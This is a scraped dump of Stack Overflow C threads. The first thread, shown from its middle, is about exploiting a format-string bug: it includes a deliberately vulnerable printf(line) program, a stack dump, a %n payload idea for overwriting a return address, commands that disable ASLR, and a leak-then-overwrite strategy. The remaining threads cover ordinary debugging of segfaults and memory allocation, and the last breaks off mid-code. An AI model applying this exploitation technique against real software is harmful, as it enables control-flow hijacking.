href=\"https://en.wikipedia.org/wiki/Address_space_layout_randomization\" rel=\"nofollow noreferrer\">ASLR</a> protection to make your stack address fixed.\nOtherwise, every time you execute your program.\nYour line variable address will be different.</p>\n\n<p>Disable it:</p>\n\n<p><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>\n\n<p>Enable it:</p>\n\n<p><code>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>\n\n<p>But, I don't think your problem will be how to write <code>0xbffff0fc</code> to stack.\nYour problem should be how to get the variable address of <code>line</code> with <code>ASLR</code> enabled.</p>\n\n<p>Here is the strategy.</p>\n\n<ol>\n<li><p>Leak the ebp of stack frame then you could calculate the address of <code>line</code> variable.(This part is <strong>important</strong>)</p></li>\n<li><p>Do the same thing of the previous sample exploit.</p></li>\n<li><p>Then, use <code>%n</code> to rewrite return address of function.</p></li>\n</ol>\n\n<p>If you have question, feel free to ask me.</p>\n"}], "owner": {"reputation": 37, "user_id": 6106709, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a022b4e6855e4b9999a8cfdba42e452?s=128&d=identicon&r=PG&f=1", "display_name": "yeahservice", "link": "https://stackoverflow.com/users/6106709/yeahservice"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1904, "favorite_count": 0, "accepted_answer_id": 41375819, "answer_count": 1, "score": 1, "last_activity_date": 1483020228, "creation_date": 1482881576, "last_edit_date": 1482887186, "question_id": 41353503, "link": "https://stackoverflow.com/questions/41353503/c-format-string-vulnerability-how-to-get-address-in-buffer", "title": "C Format-String vulnerability, how to get address in buffer", "body": "<p>I have a program that loops and reads from stdin with fgets. The whole read loop is located in a function and I am trying to overwrite the return address of the function with the printf vulnerability. The return address is located at 0xbffff0fc (it is 0x2a20029e) and the buffer on the stack is identified by the input AAAA (0x41414141).</p>\n\n<pre><code>0xbffff0b0: 0x0000000a  0x00000020  0xb7fc7c20  0xb7e4fd94\n0xbffff0c0: 0xb7fc73cc  0xbffff0dc  0x41414141  0x66740000\n0xbffff0d0: 0x785c2220  0x785c3439  0x785c3739  0x785c3430\n0xbffff0e0: 0x29223830  0xb7fc0000  0x5da95700  0x00000000\n0xbffff0f0: 0x00000000  0xb7fc7000  0x00000000  0x2a20029e\n</code></pre>\n\n<p>So from my understanding I need to write 0xbffff0fc in the buffer and then I can use %x%6$n (k is an integer) to write an arbitrary value to 0xbffff0fc.</p>\n\n<p>So the input would look something like this: &lt;0xbffff0fc>%x%6$n. The problem I have is how do I write &lt;0xbffff0fc> so that it is 0xbffff0fc on the stack. With the ASCII characters alone I cannot really do this.</p>\n\n<p>Edit: added the program</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint function1()\n{\n  char line[32];\n  size_t size;\n  while(1)\n  {\n    if (!fgets(line, sizeof(line), stdin))\n    {\n      return 0;\n    }\n\n    size = strlen(line);\n    line[size - 1] = '\\0';\n    printf(line);\n    printf(\"\\n\");\n  }\n  return 0;\n}\n\nint main(int argc, char** argv)\n{\n    function1();\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "runtime", "runtime-error"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482880911, "post_id": 41353370, "comment_id": 69908831, "body": "&quot;gives me an runtime error.&quot; --&gt; what is the text of that run time error?  What input was used?"}, {"owner": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482881000, "post_id": 41353370, "comment_id": 69908856, "body": "i cannot know, it just says runtime error"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1482881008, "post_id": 41353370, "comment_id": 69908859, "body": "Curious, why the <code>if (ptr2){</code> test <i>after</i> using <code>ptr2</code> in <code>memset(ptr2,0...);</code>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482881042, "post_id": 41353370, "comment_id": 69908869, "body": "You don&#39;t know what input was used?"}, {"owner": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482881194, "post_id": 41353370, "comment_id": 69908904, "body": "Yeah i don&#39;t know,they do have their test cases  &amp; true maybe i have to put that line after the if statement"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1482881474, "post_id": 41353370, "comment_id": 69908973, "body": "If test case input contains non-numeric input or unexpected numeric input like -1, 2000000000 for <code>cases</code>, certainly bad this will happen.  Suggest qualifying input by checking the return value of <code>scanf()</code> and if OK, test for a reasonable range of input value."}, {"owner": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482881493, "post_id": 41353370, "comment_id": 69908981, "body": "Thanks chux, it&#39;s solved after switching &#39;if (ptr2){&#39; with &#39;memset(ptr2,0...);&#39;"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 3, "creation_date": 1482881654, "post_id": 41353370, "comment_id": 69909028, "body": "Even though switching the line <code>memset()</code> location <i>apparently</i> solved something, certainly code needs more error checking."}, {"owner": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482924864, "post_id": 41353370, "comment_id": 69923522, "body": "I didn&#39;t have to check since the problem says that the input would be from 1 - 100."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482941072, "post_id": 41353370, "comment_id": 69932654, "body": "&quot; input would be from 1 - 100. &quot; is not in the post.  Why omit critical information?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482942891, "post_id": 41353370, "comment_id": 69933637, "body": "&quot;I didn&#39;t have to check &quot; does not mean code must not do error checking.   Adding error checking, even when not required, not only helps perform checks, it also helps in debugging and can save time - likely negating the need for this post."}], "answers": [{"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": true, "score": 1, "last_activity_date": 1548755532, "creation_date": 1548755532, "answer_id": 54418237, "question_id": 41353370, "link": "https://stackoverflow.com/questions/41353370/runtime-error-c-programming/54418237#54418237", "title": "Runtime error - C Programming", "body": "<p>it's solved after switching 'if (ptr2){' with 'memset(ptr2,0...);' \u2013 Andrew Naguib</p>\n"}], "owner": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "accepted_answer_id": 54418237, "answer_count": 1, "score": 0, "last_activity_date": 1548755532, "creation_date": 1482880448, "last_edit_date": 1483098268, "question_id": 41353370, "link": "https://stackoverflow.com/questions/41353370/runtime-error-c-programming", "title": "Runtime error - C Programming", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nint main()\n{\n    int cases, num1, num2, var, *ptr2, count, i;\n    scanf(\"%d\", &amp;cases);\n    ptr2 = (int*)malloc(sizeof(int) * cases);\n    memset(ptr2, 0, sizeof(int) * cases);\n    if (ptr2) {\n        for (count = 0; count &lt; cases; count++) {\n            scanf(\"%d\", &amp;num1);\n            scanf(\"%d\", &amp;num2);\n            for (i = 0; i &lt; num1; i++) {\n                scanf(\"%d\", &amp;var);\n                ptr2[count] += var / num2;\n            }\n        }\n        for (i = 0; i &lt; cases; i++) {\n            printf(\"%d\\n\", ptr2[i]);\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Here's the description of the problem <a href=\"https://a2oj.com/p?ID=17\" rel=\"nofollow noreferrer\">https://a2oj.com/p?ID=17</a>\nIt runs on VS IDE very well, but for some reason when I submit it their environment gives me an runtime error.</p>\n"}, {"tags": ["c", "struct", "utf-8", "segmentation-fault", "malloc"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1482881915, "post_id": 41353355, "comment_id": 69909113, "body": "Without true code, this code description is challenging, and IMO, insufficient to determine the segmentation fault.  It would be better for all to see the true code."}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1482883940, "post_id": 41353355, "comment_id": 69909521, "body": "Wellcome to SO. Please look into this <a href=\"https://stackoverflow.com/help/mcve\">stackoverflow.com/help/mcve</a> to create a minimal example of your code producing the error."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482891995, "post_id": 41353355, "comment_id": 69911019, "body": "You can&#39;t use <code>Replac **replace</code> like that you only have allocate one <code>Replac</code>. <a href=\"http://stackoverflow.com/questions/12462615/how-do-i-correctly-set-up-access-and-free-a-multidimensional-array-in-c\" title=\"how do i correctly set up access and free a multidimensional array in c\">stackoverflow.com/questions/12462615/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 7347558, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3a0b91a13ce7fed103c29658e36ac1a5?s=128&d=identicon&r=PG&f=1", "display_name": "Crisapx", "link": "https://stackoverflow.com/users/7347558/crisapx"}, "edited": false, "score": 0, "creation_date": 1482928851, "post_id": 41356962, "comment_id": 69925841, "body": "I&#39;m not writing anything in the file, the file is simply a utf8char followed by a tab followed by a ascii representation, for  example &#199; tab ,C or &#163; tab pound."}], "tags": [], "owner": {"reputation": 26606, "user_id": 4603670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7eabc1427aa3c8185153cc81978289a?s=128&d=identicon&r=PG&f=1", "display_name": "Barmak Shemirani", "link": "https://stackoverflow.com/users/4603670/barmak-shemirani"}, "is_accepted": false, "score": 0, "last_activity_date": 1482908486, "creation_date": 1482908486, "answer_id": 41356962, "question_id": 41353355, "link": "https://stackoverflow.com/questions/41353355/problems-using-malloc-structs-and-probably-parameters/41356962#41356962", "title": "Problems using malloc, structs and probably parameters", "body": "<pre><code>f = fopen( inputfile, \"r\" );\n...\ntypedef struct \n{\n    char utf8[max_UTF];\n    char ascii_seq[max_ASCII];\n    int count;\n} Replac;\n...\nfgets(data,sizeof data,f);\n</code></pre>\n\n<p>You are mixing binary and text format. </p>\n\n<p>Depending on the compiler, <code>sizeof(Replac)</code> will be <code>16</code>. This includes <code>sizeof(int)</code> which is always <code>4</code>. There may also be padding if size is not a multiple of <code>4</code>. </p>\n\n<p>If your data is stored as text, then it will be something like this:</p>\n\n<pre><code>ABCDE\\tABCDEFG123456\\n\n</code></pre>\n\n<p>Note that the size of integer in decimal format is anywhere between 0 to 10, so the size is not fixed. And there are (or there should be) new line <code>\\n</code> characters.</p>\n\n<p>So you don't want to read exactly 16 characters. You want to write and then read 3 lines for each record. Example:</p>\n\n<pre><code>ABCDE\\n\nABCDEFG\\n\n123456\\n\n</code></pre>\n\n<p>If you are reading in binary, then open the file in binary and use <code>fwrite</code> and <code>fread</code>. Example:</p>\n\n<pre><code>f = fopen( inputfile, \"rb\" );\nReplac data;\nfread(f, sizeof(data), 1, f);\n</code></pre>\n\n<p>This all depends on how your file was created. If you are writing the file yourself, then show the code you used for writing the data.</p>\n\n<p>Also, ASCII is a subset of Unicode. <code>A</code> in ASCII has the exact same representation as <code>A</code> in UTF8.</p>\n"}, {"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 0, "last_activity_date": 1548758291, "creation_date": 1548758291, "answer_id": 54419144, "question_id": 41353355, "link": "https://stackoverflow.com/questions/41353355/problems-using-malloc-structs-and-probably-parameters/54419144#54419144", "title": "Problems using malloc, structs and probably parameters", "body": "<blockquote>\n<pre><code>        strcpy(replace[j]-&gt;utf8, strtok(data, \"\\t\"));                   \n</code></pre>\n  \n  <p>I get a segmentation fault after that instruction.</p>\n</blockquote>\n\n<p>You just got the dereferencing order wrong. You first subscripted with <code>[j]</code> and then dereferenced with <code>-&gt;</code>, as if we had an array of pointers to <code>Replac</code>s. But we rather have a pointer to (the first element of) an array of <code>Replac</code>s, hence we must dereference the pointer first and subscript thereafter, i. e. instead of</p>\n\n<pre><code>                replace[j]-&gt;utf8\n</code></pre>\n\n<p>we have to write</p>\n\n<pre><code>                (*replace)[j].utf8\n</code></pre>\n\n<p>or the equivalent</p>\n\n<pre><code>                (*replace+j)-&gt;utf8\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 7347558, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3a0b91a13ce7fed103c29658e36ac1a5?s=128&d=identicon&r=PG&f=1", "display_name": "Crisapx", "link": "https://stackoverflow.com/users/7347558/crisapx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 90, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1548758291, "creation_date": 1482880349, "last_edit_date": 1592644375, "question_id": 41353355, "link": "https://stackoverflow.com/questions/41353355/problems-using-malloc-structs-and-probably-parameters", "title": "Problems using malloc, structs and probably parameters", "body": "<p>EDIT: OK, I hear you guys, I've isolated the part of my code that's giving me problems, compiled it and made sure that it still gave me the same results, here it goes:\nLike before, the segfault appears after the first instance of the for loop on\nstrcpy(replace[j]-&gt;utf8, strtok(data, &quot;\\t&quot;)); Thanks again!</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;locale.h&gt;\n\n#define max_chars 45\n#define max_UTF 5\n#define max_ASCII 7\n#define max_word_length 30\n#define max_line_length 70\n#define max_texto_line 5000\n\ntypedef struct {\nchar utf8[max_UTF];\nchar ascii_seq[max_ASCII];\nint count;\n} Replac; \n\n\nvoid getTable(FILE *f, char inputfile[],Replac **replace){\n    char data[max_line_length];\n    int j;\n    f = fopen( inputfile, &quot;r&quot; );\n    if (f == NULL) {\n        fprintf(stderr, &quot;Can't open input file %s!\\n&quot;,inputfile);\n        exit(1);\n    }\n    \n    fgets(data,sizeof data,f);\n    for(j=0 ; strcmp(data,&quot;\\n&quot;) ; fgets(data,sizeof data,f), j++){  \n        if (feof(f)) {                                      \n            break;\n        }\n        strcpy(replace[j]-&gt;utf8, strtok(data, &quot;\\t&quot;));                   \n        strcpy(replace[j]-&gt;ascii_seq, strtok(NULL, &quot;\\n&quot;));\n    }\n    fclose(f);\n}\n\nint main( int argc, char *argv[] ){\n    Replac *replace=malloc(max_chars * sizeof(Replac));\n    FILE *fpr,*f,*fpw;\n    int carprocess = 0;\n    setlocale(LC_ALL,&quot;pt_PT.UTF-8&quot;);\n    setlocale(LC_COLLATE,&quot;pt_PT.UTF-8&quot;);\n    \n    \n    getTable(f,argv[1],&amp;replace);\n}\n</code></pre>\n<p>The text file that I'm copying the character from is formated something like this</p>\n<pre><code>UTFCHAR \\tab asciichar\n</code></pre>\n<p>ex</p>\n<pre><code>\u00c1   'A\n</code></pre>\n<p>END EDIT</p>\n<h1>-#-##-###-####-####+#####+####p</h1>\n<p>So I'm a beginner using C, and I've tried all I could think of, this seems like a pretty straight forward thing to do, but since I'm having such trouble clearly shows I have some gap in my knowledge...</p>\n<p>I wont bother you with the full code since it is working perfectly, it's just that I wanted to do things differently and that's when the trouble started.</p>\n<p>In short I'm doing a program that collects a set of chars of UTF8 type, and their ascii replacement, and stores them in a struct such as</p>\n<pre><code> typedef struct {\nchar utf8[max_UTF];\nchar ascii_seq[mac_ASCII];\n} Replac; \n</code></pre>\n<p>then in main I did the malloc like this</p>\n<pre><code>Replac *replace=malloc(max_chars * sizeof(Replac));\n</code></pre>\n<p>If my thought process is correct, this would create a block of available memory to which *replace is pointing to the starting address.</p>\n<p>Then I made a function that scans a few UTF8 chars and their replacement and stores them in the struct, something like</p>\n<pre><code>void getTable(FILE *f, char inputfile[],Replac **replace)\n</code></pre>\n<p>now, following the debugger, it seems that I'm creating new variable replace of the type Replace** that's on a completely different address, but inside that address is stored the value to the original malloced struct that I passed through the param.</p>\n<p>After that I do a</p>\n<pre><code>strcpy(replace[0]-&gt;utf8, something I got from the table);\n</code></pre>\n<p>following the debugger and searching through the memory adresses, I see that the first time I do this, the first position of the malloc struct is indeed filled with the right data.</p>\n<p>followed by</p>\n<pre><code>strcpy(replace[0]-&gt;ascii_seq, corresponding ascii sequence to the previous UTF8 char);\n</code></pre>\n<p>and that fills the next memory position in the memory block.</p>\n<p>So I get something like while debugging on my variables watch</p>\n<p>address replace = (Replac **) 0xbf8104fc that contains 0x0878a008</p>\n<p>address *replace = (Replac *) 0x0878a008 that contains the whole struct\nso inside the address 0x0878a008 I get the data of the utf8 char and then at the address 0x0878a00d I get the ascii seq.</p>\n<p>The problem in on the next instance of the loop, when it's time to</p>\n<pre><code>strcpy(replace[1]-&gt;utf8, something I got from the table);\n</code></pre>\n<p>I get a segmentation fault after that instruction.</p>\n<p>So what do you guys think? Am I approaching things correctly, and I'm getting screwed over by syntax or something like that, or is it the base of my knowledge flawed?</p>\n<p>Thanks, and a late happy holidays!</p>\n"}, {"tags": ["c"], "answers": [{"comments": [{"owner": {"reputation": 733, "user_id": 4224112, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/99108dc591ff29f0e0f5251e1072cac7?s=128&d=identicon&r=PG&f=1", "display_name": "cheroky", "link": "https://stackoverflow.com/users/4224112/cheroky"}, "edited": false, "score": 0, "creation_date": 1482880180, "post_id": 41353045, "comment_id": 69908597, "body": "What happen with &quot;hello&quot; is lost?"}, {"owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "reply_to_user": {"reputation": 733, "user_id": 4224112, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/99108dc591ff29f0e0f5251e1072cac7?s=128&d=identicon&r=PG&f=1", "display_name": "cheroky", "link": "https://stackoverflow.com/users/4224112/cheroky"}, "edited": false, "score": 1, "creation_date": 1482880604, "post_id": 41353045, "comment_id": 69908746, "body": "@cheroky, If you had allocated that memory, it would be a memory leak because you could never free it. However, since it is a string literal whose memory was allocated by the compiler (likely in a read-only region), you could never free it anyways, so not having a pointer to it is irrelevant."}], "tags": [], "owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "is_accepted": true, "score": 10, "last_activity_date": 1482878180, "creation_date": 1482878180, "answer_id": 41353045, "question_id": 41353033, "link": "https://stackoverflow.com/questions/41353033/assign-to-a-string-literal-an-array/41353045#41353045", "title": "Assign to a string literal an array", "body": "<p>There is no UB here. You are simply re-assigning a pointer to point at the address of the start of the array instead.</p>\n\n<p>Note that you are not actually modifying the value that <code>a</code> is pointing at, only <code>a</code> itself, and <code>a</code> is a normal <code>char *</code>.</p>\n"}], "owner": {"reputation": 733, "user_id": 4224112, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/99108dc591ff29f0e0f5251e1072cac7?s=128&d=identicon&r=PG&f=1", "display_name": "cheroky", "link": "https://stackoverflow.com/users/4224112/cheroky"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 0, "accepted_answer_id": 41353045, "answer_count": 1, "score": 3, "last_activity_date": 1482879081, "creation_date": 1482878105, "question_id": 41353033, "link": "https://stackoverflow.com/questions/41353033/assign-to-a-string-literal-an-array", "title": "Assign to a string literal an array", "body": "<p>It is undefined behavior to do this?</p>\n\n<pre><code>char *a = \"hello\";\nchar b[] = \"abcd\";\na = b;\n</code></pre>\n\n<p>My compiler throws no warning, with the maximum warning level.</p>\n"}, {"tags": ["c", "vector", "memcpy", "gsl"], "comments": [{"owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1483610532, "post_id": 41352950, "comment_id": 70169135, "body": "What is <code>NO_PARAMS</code> defined to?"}, {"owner": {"reputation": 3, "user_id": 7228874, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbd9280d9c2cd9c0c2cdd0dbefd2774d?s=128&d=identicon&r=PG&f=1", "display_name": "MinimizeTheAction", "link": "https://stackoverflow.com/users/7228874/minimizetheaction"}, "reply_to_user": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1483720851, "post_id": 41352950, "comment_id": 70226169, "body": "4 i.e. [id #, amplitude, mean, sigma]"}, {"owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1484034840, "post_id": 41352950, "comment_id": 70331763, "body": "I see no error in the code shown except the noncritical use of <code>sizeof(gsl_vector)</code> instead of <code>sizeof (gsl_vector *)</code> in the <code>realloc()</code> calls, which just allocates more memory than needed. But there are important details missing, such as the exact order of execution; a complete example program would be fit."}], "owner": {"reputation": 3, "user_id": 7228874, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cbd9280d9c2cd9c0c2cdd0dbefd2774d?s=128&d=identicon&r=PG&f=1", "display_name": "MinimizeTheAction", "link": "https://stackoverflow.com/users/7228874/minimizetheaction"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 452, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1484542980, "creation_date": 1482877585, "last_edit_date": 1484542980, "question_id": 41352950, "link": "https://stackoverflow.com/questions/41352950/gsl-vector-memcpy-and-dynamic-memory-allocation", "title": "gsl_vector_memcpy and dynamic memory allocation", "body": "<p>I have an array of pointers to gsl_vectors which is to constantly change size. Each vector stores an ID number and parameters for a mathematical model; specifically a Gaussian i.e. amplitude, mean, variance. Two arrays are in use, vector_ptr_array_current and vector_ptr_array_proposed which store pointers to gsl_vectors. Throughout a for loop the number of gsl_vectors used in the model, each representing an individual Gaussian, changes as the code is trying to determine how many are needed to best fit the data. The array vector_ptr_array_current stores the vectors currently being considered while vector_ptr_array_proposed stores vectors under consideration. If the ones (number of vectors in proposed array may be of a different length) under consideration are accepted I want the code to copy and store them into vector_ptr_array_current. As of right now the code I post below stores the first pointer form vector_ptr_array_propsed into vector_ptr_array_current successfully through the use of gsl_vector_memcpy(gsl_vector * dest, gsl_vector * src) in a for loop, but fails to do so for a second Gaussian. The gsl_vector_memcpy command successfully works, but if I try to print the vector contents of the second Gaussian I get a Segmentation fault: 11.</p>\n\n<p>Now I will run through the code. The headers included are</p>\n\n<pre><code>/*--------Include Files-----------------------------------------------------------------*/\n#include &lt;stdio.h&gt;\n#include &lt;gsl/gsl_rng.h&gt;\n#include &lt;gsl/gsl_randist.h&gt;\n#include &lt;gsl/gsl_math.h&gt;\n#include &lt;math.h&gt;\n</code></pre>\n\n<p>The relevant globals are </p>\n\n<pre><code>int no_comp_current;             // counter for number of components in use currently\nint no_comp_proposed;            // number of components proposed\ngsl_vector **vector_ptr_array_current;\ngsl_vector **vector_ptr_array_proposed;\n</code></pre>\n\n<p>where a \"component\" is a Gaussian. Inside main(int arg, char* arg[]) two gsl_vectors are initialized </p>\n\n<pre><code>gsl_vector *x,*y;            // current state gsl_vector, and proposed\nx = gsl_vector_alloc(4);     // allocate memory for gsl_vector\ny = gsl_vector_alloc(4);     // for proposal components\n</code></pre>\n\n<p>and memory is allocated for the gsl_vector pointer arrays</p>\n\n<pre><code>vector_ptr_array_current = (gsl_vector **)malloc(sizeof(gsl_vector)*1);\nvector_ptr_array_proposed = (gsl_vector **)malloc(sizeof(gsl_vector)*1);\n</code></pre>\n\n<p>no_comp_current and no_comp_proposed are set to one and a gsl_vector is initialized and stored inside vector_ptr_array_current. The function which prints the components stored in a pointer array is</p>\n\n<pre><code>void print_components(gsl_vector *vector_ptr_array[], int length) {\n    int i; // loop counter\n    gsl_vector *current_comp_ptr; // gsl_vector ptr for current component under consideration\n\n    // variable initialization\n    int id;\n    double amp,mean,sigma;\n\n    for (i=0;i&lt;length;i++) {\n        current_comp_ptr = vector_ptr_array[i];\n        id = gsl_vector_get(current_comp_ptr,0); // get the id from current vector\n        amp = gsl_vector_get(current_comp_ptr,1);\n        mean = gsl_vector_get(current_comp_ptr,2); \n        sigma = gsl_vector_get(current_comp_ptr,3);  \n        printf(\"ID: %i, amplitude: %f, mean: %f, sigma %f \\n\",id,amp,mean,sigma);\n    }\n\n    